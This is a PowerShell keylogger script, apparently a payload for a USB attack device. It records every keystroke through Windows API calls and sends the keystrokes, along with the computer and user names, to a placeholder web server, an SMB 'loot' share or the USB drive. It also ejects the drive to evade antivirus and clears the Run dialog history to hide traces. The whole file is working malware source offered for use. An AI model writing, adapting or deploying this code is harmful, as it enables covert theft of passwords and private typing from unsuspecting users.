Param([boolean]$CLEANUP, [string]$global:exfilMethod)

# ----- EXFIL SETTINGS -----

# --- Web ---
# The backend's uri
$global:web_uri = "http://your.server/keypress.php"

# --- SMB ---
# The Bunny's IP
$global:bunny_ip = "172.16.64.1"

function Base64-Encode($data)
{
	return [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($data)) # Requires ASCII to work well with PHP :(
}

function Init-Exfil()
{
	switch ($global:exfilMethod)
	{
		w # Web
		{
			# Request a token from the webserver because I really dislike the idea of the computer and the users name being sent every time.
			$computer = Base64-Encode($env:computername);
			$user = Base64-Encode($env:username)
			$global:web_token = Invoke-WebRequest -URI ($global:web_uri + "?type=register&computer=" + $computer + "&user=" + $user)
			
			# Eject the USB drive to prevent eventual AV detection
			$ejector = New-Object -comObject Shell.Application
			$ejector.NameSpace(17).ParseName($global:Bunny).InvokeVerb("Eject")
		}
		s # SMB
		{
			$folderName = "\\$global:bunny_ip\loot\Keylogger2\$env:computername-$env:username"
			try
			{
				New-Item -Path $folderName -ItemType directory -Force
			}
			finally
			{
				"Folder exists"
			}
			$dateTime = (Get-Date).ToString('yyyy-MM-dd_hhmmtt')
			$global:usb_fileName = "$folderName\" + $dateTime + ".txt"
			$null = New-Item -Path $global:usb_fileName -ItemType File -Force
		}
		default # USB
		{
			$folderName = "$global:Bunny\loot\Keylogger2\$env:computername-$env:username"
			try
			{
				New-Item -Path $folderName -ItemType directory -Force
			}
			finally
			{
				"Folder exists"
			}
			$dateTime = (Get-Date).ToString('yyyy-MM-dd_hhmmtt')
			$global:usb_fileName = "$folderName\" + $dateTime + ".txt"
			$null = New-Item -Path $global:usb_fileName -ItemType File -Force
		}
	}
}

function Perform-Exfil($payload)
{
	switch ($global:exfilMethod)
	{
		w
		{
			$encoded = Base64-Encode($payload)
			$resp = Invoke-WebRequest -URI ($global:web_uri + "?type=key&token=" + $global:web_token + "&key=" + $encoded)
			if ("$resp" -ne "ok")
			{
				exit 1
			}
		}
		default # USB
		{
			[System.IO.File]::AppendAllText($global:usb_fileName, $payload, [System.Text.Encoding]::Unicode);
		}
	}
}

#requires -Version 2
function Log-Keys($Path="$env:temp\a.txt")
{
# Signatures for API Calls
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
	$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
	try
	{
		Write-Output 'KeyLogger started'
		while ($true)
		{
			Start-Sleep -Milliseconds 40
			for ($ascii = 9; $ascii -le 254; $ascii++)
			{
				$state = $API::GetAsyncKeyState($ascii)
				# is key pressed?
				if ($state -eq -32767)
				{
					$null = [console]::CapsLock
					$virtualKey = $API::MapVirtualKey($ascii, 3)
					$kbstate = New-Object Byte[] 256
					$checkkbstate = $API::GetKeyboardState($kbstate)
					$mychar = New-Object -TypeName System.Text.StringBuilder
					$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
					if ($success)
					{
						Perform-Exfil($mychar)
						#[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
					}
				}
			}
		}
	}
	finally
	{
		# Oups, keylogger was terminated :(
	}
}

$global:Bunny = $PSScriptRoot.Split("\")[0]; # We don't need the correct name anymode

if ($CLEANUP)
{
	Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
	"Cleaned up"
}

Init-Exfil
Log-Keys($global:usb_fileName)
